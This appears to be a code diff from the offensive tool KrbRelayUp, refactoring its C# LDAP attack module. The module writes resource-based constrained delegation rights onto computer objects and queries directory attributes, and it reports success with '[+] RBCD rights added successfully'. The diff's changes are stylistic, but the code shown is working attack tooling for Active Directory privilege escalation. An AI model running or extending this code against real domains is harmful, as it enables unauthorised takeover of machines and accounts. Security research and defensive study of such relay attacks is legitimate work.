@@ -47,7 +47,7 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
                 value
             };
             var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
-            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? new byte[0]).ToArray(), modValuePtr);
+            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
             List<LDAPMod> mod = new List<LDAPMod> {
                 new LDAPMod {
                     mod_op = (int)LdapModOperation.LDAP_MOD_REPLACE | (int)LdapModOperation.LDAP_MOD_BVALUES,
@@ -63,7 +63,7 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
             Helpers.StructureArrayToPtr(mod, ptr, true);
 
             //int rest = ldap_modify_ext(ld, dn, ptr, IntPtr.Zero, IntPtr.Zero, out int pMessage);
-            int rest = Natives.ldap_modify_s(ld, dn, ptr);
+            int rest = ldap_modify_s(ld, dn, ptr);
             if ((LdapStatus)rest == LdapStatus.LDAP_SUCCESS)
             {
                 Console.WriteLine("[+] RBCD rights added successfully");
@@ -101,7 +101,7 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
                 value
             };
             var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
-            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? new byte[0]).ToArray(), modValuePtr);
+            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
             List<LDAPMod> mod = new List<LDAPMod> {
                 new LDAPMod {
                     mod_op = (int)LdapModOperation.LDAP_MOD_ADD | (int)LdapModOperation.LDAP_MOD_BVALUES,
@@ -148,64 +148,11 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
             IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
             var controlPtr = Marshal.StringToHGlobalUni("DistinguishedName");
             Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
-            var search = Natives.ldap_search(
-                ld,
-                $"{Relay.domainDN}",
-                (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
-                String.Format("(&(objectClass=computer)(sAMAccountName={0}))", computername),
-                pLaps,
-                0);
-            //Console.WriteLine("[*] msgID: {0}", search);
-
-            IntPtr pMessage = IntPtr.Zero;
-            var r = Natives.ldap_result(
-                ld,
-                search,
-                0,
-                timeout,
-                ref pMessage);
-            var entry = ldap_first_entry(ld, pMessage);
-            IntPtr ber = IntPtr.Zero;
-            var attr = ldap_first_attribute(ld, entry, ref ber);
-            var vals = ldap_get_values_len(ld, entry, attr);
-            var attrName = Marshal.PtrToStringUni(attr);
-            //Console.WriteLine("ldap_first_attribute: {0}", attr);
-            //Console.WriteLine("ldap_get_values_len: {0}", vals);
-            //Console.WriteLine("attrName: {0}", attrName);
-
-            var result = new List<byte[]>();
-            foreach (var tempPtr in Helpers.GetPointerArray(vals))
-            {
-                Natives.berval bervalue = (Natives.berval)Marshal.PtrToStructure(tempPtr, typeof(Natives.berval));
-                if (bervalue.bv_len > 0 && bervalue.bv_val != IntPtr.Zero)
-                {
-                    var byteArray = new byte[bervalue.bv_len];
-                    Marshal.Copy(bervalue.bv_val, byteArray, 0, bervalue.bv_len);
-                    result.Add(byteArray);
-                }
-            }
-            byte[] t = result.SelectMany(a => a).ToArray();
-            //Console.WriteLine("[+] {0}: {1}", attribute, Encoding.ASCII.GetString(t));
-
-            Marshal.FreeHGlobal(controlPtr);
-            return Encoding.ASCII.GetString(t);
-            //return "";
-        }
-
-        public static string getPropertyValue(IntPtr ld, string adObject, string property)
-        {
-            var timeout = new Natives.LDAP_TIMEVAL
-            {
-                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
-            };
-            IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
-            var controlPtr = Marshal.StringToHGlobalUni(property);
-            Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
             var search = ldap_search(
                 ld,
                 $"{Relay.domainDN}",
                 (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
-                String.Format("(&(objectClass=*)(sAMAccountName={0}))", adObject),
+                $"(&(objectClass=computer)(sAMAccountName={computername}))",
                 pLaps,
                 0);
             //Console.WriteLine("[*] msgID: {0}", search);
@@ -229,7 +176,60 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
             var result = new List<byte[]>();
             foreach (var tempPtr in Helpers.GetPointerArray(vals))
             {
-                Natives.berval bervalue = (Natives.berval)Marshal.PtrToStructure(tempPtr, typeof(Natives.berval));
+                berval bervalue = (berval)Marshal.PtrToStructure(tempPtr, typeof(berval));
+                if (bervalue.bv_len > 0 && bervalue.bv_val != IntPtr.Zero)
+                {
+                    var byteArray = new byte[bervalue.bv_len];
+                    Marshal.Copy(bervalue.bv_val, byteArray, 0, bervalue.bv_len);
+                    result.Add(byteArray);
+                }
+            }
+            byte[] t = result.SelectMany(a => a).ToArray();
+            //Console.WriteLine("[+] {0}: {1}", attribute, Encoding.ASCII.GetString(t));
+
+            Marshal.FreeHGlobal(controlPtr);
+            return Encoding.ASCII.GetString(t);
+            //return "";
+        }
+
+        public static string getPropertyValue(IntPtr ld, string adObject, string property)
+        {
+            var timeout = new LDAP_TIMEVAL
+            {
+                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
+            };
+            IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
+            var controlPtr = Marshal.StringToHGlobalUni(property);
+            Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
+            var search = ldap_search(
+                ld,
+                $"{Relay.domainDN}",
+                (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
+                $"(&(objectClass=*)(sAMAccountName={adObject}))",
+                pLaps,
+                0);
+            //Console.WriteLine("[*] msgID: {0}", search);
+
+            IntPtr pMessage = IntPtr.Zero;
+            var r = ldap_result(
+                ld,
+                search,
+                0,
+                timeout,
+                ref pMessage);
+            var entry = ldap_first_entry(ld, pMessage);
+            IntPtr ber = IntPtr.Zero;
+            var attr = ldap_first_attribute(ld, entry, ref ber);
+            var vals = ldap_get_values_len(ld, entry, attr);
+            var attrName = Marshal.PtrToStringUni(attr);
+            //Console.WriteLine("ldap_first_attribute: {0}", attr);
+            //Console.WriteLine("ldap_get_values_len: {0}", vals);
+            //Console.WriteLine("attrName: {0}", attrName);
+
+            var result = new List<byte[]>();
+            foreach (var tempPtr in Helpers.GetPointerArray(vals))
+            {
+                berval bervalue = (berval)Marshal.PtrToStructure(tempPtr, typeof(berval));
                 if (bervalue.bv_len > 0 && bervalue.bv_val != IntPtr.Zero)
                 {
                     var byteArray = new byte[bervalue.bv_len];
